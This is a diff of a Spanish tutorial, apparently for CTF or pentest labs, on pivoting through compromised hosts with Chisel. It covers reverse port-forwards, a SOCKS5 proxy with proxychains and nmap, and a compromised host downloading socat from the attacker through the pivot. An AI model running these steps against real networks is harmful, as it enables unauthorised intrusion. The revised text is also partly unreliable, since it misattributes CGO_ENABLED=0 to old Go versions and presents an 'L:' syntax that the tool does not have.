@@ -1,149 +1,228 @@
-Perfecto, Jorge. Vamos a actualizar el post incluyendo la configuración de **Proxychains** para que quede completo y funcional.
-# Pivoting con Chisel
+# Pivoting con Chisel – Versión Final
 
 ## Introducción
 
-[Chisel](https://github.com/jpillora/chisel) es una herramienta escrita en Go que permite crear **túneles TCP/SOCKS reversos** y forwardings de puertos, ideal para pivoting dentro de una red comprometida.
-Permite que un atacante exponga puertos internos de la red víctima a su máquina de forma sencilla, evitando la necesidad de abrirlos directamente al exterior.
+[Chisel](https://github.com/jpillora/chisel) es una herramienta escrita en Go que permite crear **túneles TCP/SOCKS reversos** y forwardings de puertos.
+Es ideal para pivoting dentro de redes comprometidas, permitiendo:
+
+* Traer servicios internos hacia tu host (reverse).
+* Servir recursos de tu host hacia la red interna (forward).
+* Pivotar tráfico TCP mediante SOCKS5 y Proxychains.
 
 ---
 
 ## Instalación
 
-Primero clonamos el repositorio y compilamos.
-En este caso, como **la versión de glibc en la máquina destino estaba desactualizada**, usamos `CGO_ENABLED=0` para asegurar la compatibilidad:
-
 ```bash
 git clone https://github.com/jpillora/chisel
 cd chisel
 CGO_ENABLED=0 go build -a -ldflags="-s -w" .
-upx chisel  # Opcional, para reducir el binario
+upx chisel  # Opcional para reducir el tamaño del binario
 ```
 
-> Esto genera el binario `chisel`, listo para usarse en servidores y clientes.
+> `CGO_ENABLED=0` asegura compatibilidad en máquinas con Go antiguo.
 
 ---
 
-## Uso Básico
+## Modo de Uso
 
-Chisel funciona en **modo servidor** (atacante) y **modo cliente** (víctima).
+Chisel se ejecuta como:
 
-### Servidor (Máquina Host)
+* **Servidor:** máquina atacante / host
+* **Cliente:** máquina pivote o víctima
+
+```bash
+# Servidor
+sudo ./chisel server -p 1234 [--reverse]
+
+# Cliente
+./chisel client <IP_SERVIDOR>:1234 [R:<PUERTO_LOCAL>:<IP_DESTINO>:<PUERTO_DESTINO> | L:<PUERTO_LOCAL>:<IP_DESTINO>:<PUERTO_DESTINO> | R:socks]
+```
+
+* `R:` → reverse, trae puertos internos hacia tu host
+* `L:` → forward, abre un puerto en la pivote que apunta a tu host
+* `R:socks` → levanta un proxy SOCKS5 para pivoting genérico
+
+---
+
+## Caso 1: Pivoting clásico – Reverse `R:`
+
+**Objetivo:** Traer un servicio interno hacia nuestra máquina atacante.
+
+### Ejemplo: HTTP interno
+
+* **Interna:** `172.19.0.4:80`
+* **Host:** `10.10.14.6:80`
+
+#### Servidor (Host)
 
 ```bash
 sudo ./chisel server --reverse -p 1234
 ```
 
-* `sudo` es necesario si vas a mapear puertos <1024, aunque no siempre obligatorio.
-* `--reverse` habilita la recepción de conexiones desde clientes que hacen tunelado reverso.
-* `-p 1234` define el puerto donde escuchará el servidor.
-
-### Cliente (Máquina Pwned que queremos usar como puente)
+#### Cliente (Pivote / Víctima)
 
 ```bash
-./chisel client <IP_DEL_SERVIDOR>:1234 R:<PUERTO_LOCAL>:<IP_INTERNA>:<PUERTO_REMOTO>
+./chisel client 10.10.14.6:1234 R:80:172.19.0.4:80
 ```
 
-* `R:` indica que es un **tunel reverso**.
-* `<PUERTO_LOCAL>` es el puerto en tu máquina atacante donde se expondrá el servicio.
-* `<IP_INTERNA>:<PUERTO_REMOTO>` es el destino real en la red interna.
+#### Flujo de datos visual
 
-> Ejemplo de error común:
-> Si ves mensajes como `Server cannot listen on R:80=>172.19.0.4:80`, es probable que necesites **root** para abrir puertos <1024 en tu máquina.
+```
+[Máquina Interna 172.19.0.4:80]
+              │
+              ▼
+        [Chisel Client]
+              │
+              ▼
+        [Chisel Server 10.10.14.6]
+              │
+              ▼
+[Host Atacante: localhost:80]
+```
+
+* **Resultado:** accediendo a `http://localhost:80` en tu host, estás viendo el HTTP interno.
 
 ---
 
-## Ejemplo Pivoting Simple: HTTP/80
+### Ejemplo: Redis interno
 
-Si queremos mapear el puerto HTTP interno de la víctima (`172.19.0.4:80`) a nuestro puerto local:
+* **Interna:** `172.19.0.4:6379`
+* **Host:** `10.10.14.6:8080`
 
-### Servidor
+```bash
+./chisel client 10.10.14.6:1234 R:8080:172.19.0.4:6379
+```
+
+#### Flujo de datos
+
+```
+[Redis Interno 172.19.0.4:6379]
+              │
+              ▼
+        [Chisel Client]
+              │
+              ▼
+        [Chisel Server 10.10.14.6]
+              │
+              ▼
+[Host Atacante: localhost:8080]
+```
+
+---
+
+## Caso 2: Forward desde cliente – Forward `L:`
+
+**Objetivo:** Abrir un puerto en la máquina pivote que apunte a un servicio en nuestro host.
+
+### Ejemplo: Servir un binario (`socat`) desde host a la final
+
+* **Host atacante:** `10.10.14.6:9001` (Python HTTP server)
+* **Pivote:** `172.19.0.3`
+* **Final:** `172.19.0.4`
+
+#### Servidor (Host)
+
+```bash
+./chisel server -p 1234
+python3 -m http.server 9001
+```
+
+#### Cliente (Pivote)
+
+```bash
+./chisel client 10.10.14.6:1234 3333:10.10.14.6:9001
+```
+
+* `3333` → puerto que se abre en la pivote
+* `10.10.14.6:9001` → destino real en el host
+
+#### Máquina final
+
+```bash
+curl http://172.19.0.3:3333/socat -o /tmp/socat
+chmod +x /tmp/socat
+```
+
+#### Flujo de datos visual
+
+```
+[Host Atacante 10.10.14.6:9001]
+              │
+              ▼
+        [Chisel Client en Pivote 172.19.0.3:3333]
+              │
+              ▼
+       [Máquina Final 172.19.0.4]
+```
+
+* **Resultado:** la máquina final obtiene acceso al recurso de nuestro host a través del pivote.
+
+---
+
+## Caso 3: Pivoting SOCKS + Proxychains
+
+**Objetivo:** Pivotar tráfico TCP de forma genérica.
+
+#### Servidor
 
 ```bash
 sudo ./chisel server --reverse -p 1234
 ```
 
-### Cliente (Pwned)
+#### Cliente (SOCKS)
 
 ```bash
-./chisel client 10.10.14.3:1234 R:80:172.19.0.4:80
+./chisel client 10.10.14.6:1234 R:socks
 ```
 
-* Ahora `http://localhost:80` en tu máquina atacante apuntará al servidor web interno de la víctima.
+* Levanta un proxy SOCKS5 en el host (puerto 1080 por defecto)
 
----
-
-## Ejemplo Pivote Simple Redis: puerto 6379
-
-Supongamos que hay un Redis interno en `172.19.0.4:6379` y queremos mapearlo a nuestro `localhost:8080`.
-
-### Servidor
-
-```bash
-sudo ./chisel server --reverse -p 1234
-```
-
-### Cliente (Pwned)
-
-```bash
-./chisel client 10.10.14.3:1234 R:8080:172.19.0.4:6379
-```
-
-* Ahora podemos conectar desde nuestra máquina atacante usando:
-
-```bash
-redis-cli -p 8080
-```
-
-> **Explicación:**
-> `R:8080:172.19.0.4:6379` → túnel reverso desde el puerto interno 6379 al puerto 8080 de nuestra máquina.
-
----
-
-## Pivoting con SOCKS y Proxychains
-
-Chisel permite levantar un **proxy SOCKS5** para pivotar todo tipo de tráfico TCP:
-
-### Servidor
-
-```bash
-sudo ./chisel server --reverse -p 1234
-```
-
-### Cliente (víctima) con SOCKS
-
-```bash
-./chisel client 10.10.14.3:1234 R:socks
-```
-
-* Esto levanta un **proxy SOCKS5** en el puerto por defecto del servidor (1080), que puedes usar con herramientas como `proxychains`.
-
-### Configuración de Proxychains
-
-En `/etc/proxychains.conf` o `~/.proxychains/proxychains.conf` añade o modifica la línea del final:
+#### Proxychains
 
 ```ini
-# socks5 <IP_PROXY> <PUERTO>
 socks5 127.0.0.1 1080
 ```
 
-* Esto indica que todo el tráfico de Proxychains pasará por el SOCKS5 levantado por Chisel.
-
-### Uso con Proxychains
+#### Uso
 
 ```bash
 proxychains curl http://172.19.0.4:80
 proxychains nmap -p 1-1000 172.19.0.4
 ```
 
-* Todo el tráfico será redirigido a través del túnel de la víctima, permitiendo explorar la red interna de manera segura.
+#### Flujo de datos visual
+
+```
+[Herramienta Host + Proxychains]
+              │
+              ▼
+        [Chisel SOCKS5 Server]
+              │
+              ▼
+        [Chisel Client en Pivote]
+              │
+              ▼
+          [Red Interna Víctima]
+```
+
+---
+
+## Diferencias clave: `R:` vs `L:`
+
+| Sintaxis  | Dónde abre el puerto | Caso típico                                              |
+| --------- | -------------------- | -------------------------------------------------------- |
+| `R:`      | Host atacante        | Traer servicio interno hacia tu host                     |
+| `L:`      | Víctima / pivote     | Servir binarios o recursos del host hacia la red interna |
+| `R:socks` | Host atacante        | Pivoting genérico mediante proxy SOCKS5                  |
 
 ---
 
 ## Notas y recomendaciones
 
-* Siempre usar `CGO_ENABLED=0` si la máquina destino tiene Go antiguo.
+* `CGO_ENABLED=0` si la víctima tiene Go antiguo.
 * Para puertos <1024 es necesario **root**.
-* Puedes mapear cualquier servicio TCP interno: HTTP, Redis, SMB, bases de datos, etc.
-* Chisel es ligero y portable, ideal para pruebas rápidas de pivoting.
-* Usar SOCKS + Proxychains permite pivoting **transparente para casi cualquier herramienta**.
+* Forward `L:` → útil para pasar archivos o recursos a máquinas internas.
+* Reverse `R:` → útil para traer servicios internos a tu host.
+* SOCKS + Proxychains → pivoting **transparente** para cualquier herramienta TCP.
+* Siempre documenta los puertos y rutas de flujo de datos para no perder la visibilidad de tus túneles.
